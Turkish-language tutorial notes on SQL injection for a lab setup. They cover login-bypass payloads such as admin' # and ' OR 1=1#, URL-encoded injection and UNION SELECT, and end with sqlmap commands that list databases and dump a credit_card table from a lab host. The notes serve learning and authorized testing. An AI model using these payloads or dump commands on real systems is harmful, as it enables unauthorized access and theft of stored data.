# SQL Enjeksiyon

## Temel sql komutları

- SELECT \* FROM demo;

- INSERT INTO demo (id, name, hint) VALUES (18, "James", "Guitar");

- DELETE FROM demo WHERE name = "James";

- UPDATE demo SET id = 18 WHERE name = "Ömer";

- SELECT \* FROM demo WHERE name LIKE "%E";

---

## Veritabanı Açığı Arama SQL Injection

Yorum Karakteriyle Parola Kontrolünün Devre Dışı Bırakılması

- Bir giriş sistemi temel olarak aşağıdakine benzer bir sorgu kullanabilir:

- > SELECT \* FROM accounts WHERE username='james' AND password='1111';

- Örneğin giriş formuna şu değerler girilmiş olsun:

Username: james
Password: 1111

- Uygulama bu değerleri doğrudan SQL sorgusuna ekliyorsa oluşan sorgu:

- > SELECT \* FROM accounts WHERE username='james' AND password='1111';

şeklinde olur.

- Normal durumda girişin başarılı olması için hem username hem de password koşulunun doğru olması gerekir.

⸻

Username Alanında # Yorum Karakterinin Kullanılması

- MySQL gibi # karakterini yorum başlangıcı olarak destekleyen bir DBMS’de, SQL Injection açığı bulunan güvensiz bir uygulamada sorgunun sonraki bölümü yorum hâline getirilebilir.
- Örneğin kullanıcı adı bilinen admin hesabının parola kontrolünü laboratuvar ortamında incelemek için inputlara:

Username: admin' #
Password: 979978

değerlerinin girildiğini düşünelim.

- Uygulama girdileri doğrudan sorguya birleştiriyorsa sorgu yaklaşık olarak:

- > SELECT \* FROM accounts WHERE username='admin' # ' AND password='979978';

şeklini alır.

- admin' bölümündeki ' karakteri username için açılmış string ifadesini kapatır.
- Ardından gelen # karakteri sorgunun geri kalanını yorum hâline getirir. Bu nedenle:

' AND password='979978';

bölümü SQL tarafından çalıştırılmaz.

- Etkin sorgu mantığı:

- > SELECT \* FROM accounts WHERE username='admin';

şeklinde kalır.

- Böylece parola kontrolü sorgunun çalışan bölümünden çıkarılmış olur.

Username inputu:
admin' #
Password inputu:
Herhangi bir değer
↓
SELECT _ FROM accounts
WHERE username='admin' # ' AND password='...';
↓
Etkin sorgu:
SELECT _ FROM accounts
WHERE username='admin';

⸻

Password Alanında OR 1=1 Kullanılması

- Başka bir senaryoda manipülasyon Password inputu üzerinden gerçekleştirilebilir.
- Örneğin:

Username: admin
Password: ' OR 1=1#

girildiğini düşünelim.

- Güvensiz string birleştirme kullanılıyorsa sorgu:

- > SELECT \* FROM accounts WHERE username='admin' AND password='' OR 1=1#';

şeklini alabilir.

- Burada password inputuna yazılan ilk ' karakteri password string’ini kapatır.
- Ardından:

OR 1=1

SQL sorgusunun bir parçası hâline gelir.

- Son olarak #, sorgunun geri kalanını yorum hâline getirir.

Dolayısıyla etkin sorgu:

- > SELECT \* FROM accounts WHERE username='admin' AND password='' OR 1=1;

şeklinde değerlendirilir.

- 1=1 her zaman TRUE olduğundan sorgunun mantığı yaklaşık olarak:

(username='admin' AND password='') OR TRUE

olur.

- Bu nedenle koşul yalnızca admin kaydını değil, başka kayıtları da eşleştirebilir.

Önemli: OR 1=1 kullanıldığında sorgunun yalnızca WHERE username='admin' hâline geldiğini söylemek doğru değildir. Birden fazla kayıt dönebilir ve uygulamanın hangi hesabı kullanacağı, uygulamanın sorgu sonucunu nasıl işlediğine bağlıdır.

⸻

AND 1=1 İfadesinin Tırnak İçerisinde Kalması

Örneğin inputlar:

Username: james
Password: 1111 AND 1=1#

şeklinde girilirse oluşan sorgu:

- > SELECT \* FROM accounts WHERE username='james' AND password='1111 AND 1=1#';

olabilir.

- Burada önemli nokta AND 1=1# ifadesinin hâlâ:

'...'

tırnaklarının içerisinde bulunmasıdır.

- Bu nedenle AND 1=1 ayrı bir SQL koşulu olarak çalışmaz.

Veritabanı bunu:

Password değeri = "1111 AND 1=1#"

olarak değerlendirir.

Yani:

Password:
1111 AND 1=1#
↓
password='1111 AND 1=1#'
↓
AND 1=1 SQL komutu DEĞİLDİR.
Password değerinin bir parçasıdır.

- SQL Injection’ın sorgunun mantığını değiştirebilmesi için girdinin öncelikle bulunduğu string bağlamından çıkması gerekir.

⸻

Inputların Özeti

Normal Giriş

Username: james
Password: 1111

- > SELECT \* FROM accounts WHERE username='james' AND password='1111';

⸻

Username Üzerinden Yorum Karakteri Örneği

Username: admin' #
Password: herhangi bir değer

Oluşan sorgu:

- > SELECT \* FROM accounts WHERE username='admin' # ' AND password='herhangi bir değer';

Etkin bölüm:

- > SELECT \* FROM accounts WHERE username='admin';

⸻

Password Üzerinden OR Koşulu Örneği

Username: admin
Password: ' OR 1=1#

Oluşan sorgu:

- > SELECT \* FROM accounts WHERE username='admin' AND password='' OR 1=1#';

Etkin bölüm:

- > SELECT \* FROM accounts WHERE username='admin' AND password='' OR 1=1;

⸻

Tırnak İçerisinde Kaldığı İçin SQL Koşulu Olmayan Örnek

Username: james
Password: 1111 AND 1=1#

Oluşan sorgu:

- > SELECT \* FROM accounts WHERE username='james' AND password='1111 AND 1=1#';

Burada AND 1=1# SQL mantığını değiştirmez; password string’inin bir parçasıdır.

⸻

## URL’de SQL Injection Açığı Aranması

- Kullanıcıdan alınan veriler sunucu tarafında güvenli şekilde işlenmeden doğrudan SQL sorgularına dahil edilirse SQL Injection zafiyeti oluşabilir.
- URL’deki GET parametreleri de kullanıcı tarafından kontrol edilebildiği için SQL Injection açısından test edilmesi gereken giriş noktalarından biridir.

Örneğin uygulamanın aşağıdaki gibi bir URL kullandığını düşünelim:

http://10.0.2.5/.../?username=admin

Sunucu tarafında bu değer güvensiz şekilde sorguya ekleniyorsa:

- > SELECT \* FROM accounts WHERE username='admin';

benzeri bir sorgu oluşabilir.

⸻

URL Üzerinden Yorum Karakterinin Kullanılması

Laboratuvar ortamında URL parametresi şu şekilde değiştirilebilir:

http://10.0.2.5/.../?username=admin'%23

Burada:

admin' → SQL içerisindeki string ifadesini kapatır.
%23 → # karakterinin URL-encoded karşılığıdır.

- # → MySQL'de yorum başlangıcı olarak kullanılabilir.

URL sunucu tarafından çözümlendiğinde parametre değeri:

admin'#

şeklinde işlenebilir.

Güvensiz bir sorguda bunun sonucu:

- > SELECT \* FROM accounts WHERE username='admin'#' AND password='...';

şeklinde olabilir.

# karakterinden sonraki bölüm yorum hâline geldiği için etkin sorgu:

- > SELECT \* FROM accounts WHERE username='admin';

şeklinde kalabilir.

Böylece SQL Injection açığı bulunan bir uygulamada URL parametresi üzerinden sorgunun devamındaki koşulların etkisiz hâle getirilip getirilemediği test edilebilir.

⸻

URL Üzerinden UNION SELECT Kullanılması

SQL Injection doğrulandıktan sonra kontrollü laboratuvar ortamında UNION SELECT, mevcut sorgunun sonucuna ikinci bir SELECT sorgusunun sonuçlarını ekleyip ekleyemediğini test etmek amacıyla kullanılabilir.

Kavramsal örnek:

http://10.0.2.5/.../?username=admin'%20UNION%20SELECT%20...%23

URL çözümlendiğinde mantık:

' UNION SELECT ... #

şeklindedir.

UNION SELECT kullanılabilmesi için iki sorgunun kolon sayısı ve uyumlu veri tipleri gibi yapısal gereksinimlerinin karşılanması gerekir. Bu nedenle:

- > UNION SELECT \* FROM accounts

ifadesinin doğrudan “tüm kullanıcıları çeker” şeklinde değerlendirilmesi teknik olarak doğru değildir. Çalışıp çalışmayacağı mevcut sorgunun yapısına, kolon sayısına, veri tiplerine ve uygulamanın sorgu sonuçlarını kullanıcıya yansıtıp yansıtmamasına bağlıdır.

⸻

Kısa Özet

Normal URL:
?username=admin
↓
URL-encoded yorum karakteri:
?username=admin'%23
↓
%23 = #
↓
Sunucuda:
admin'#
↓
Güvensiz SQL sorgusunda:
username='admin'# ...
↓

- # sonrasındaki SQL bölümü yorum hâline gelebilir.

Not: Bu örnekler yalnızca size ait laboratuvar sistemlerinde veya açıkça yetkilendirilmiş penetrasyon testlerinde SQL Injection mantığını öğrenmek ve doğrulamak amacıyla kullanılmalıdır.

## Sqlmap

• Web sitesindeki SQL Injection açıklarını test eder
• Veritabanını tespit eder (DB adı, tablolar, kolonlar)
• İzin varsa verileri çekebilir
• Süreci otomatikleştirir (manuel test yerine kullanılır)

// Uygun örnek: http://testsite.com/product.php?id=1 /// http://example.com/login.php?username=admin

- > sqlmap
- > sqlmap --help
- > sqlmap -u "http://10.0.2.5/mutilli/......username=admin" //açıklar taranır
- > sqlmap -u "http://10.0.2.5/mutilli/......username=admin" --dbs //veritabanlarını listele
- > sqlmap -u "http://10.0.2.5/mutilli/......username=admin" --current-db //aktif database
- > sqlmap -u "http://10.0.2.5/mutilli/......username=admin" --tables -D owasp10 //aktif database altındaki tablolar. owasp10 database adı
- > sqlmap -u "http://10.0.2.5/mutilli/......username=admin" --columns -T credit_card -D owasp10 //aktif database altındaki tablolardaki satırlar
- > sqlmap -u "http://10.0.2.5/mutilli/......username=admin" -T credit_card -D owasp10 --dump //verileri çeker
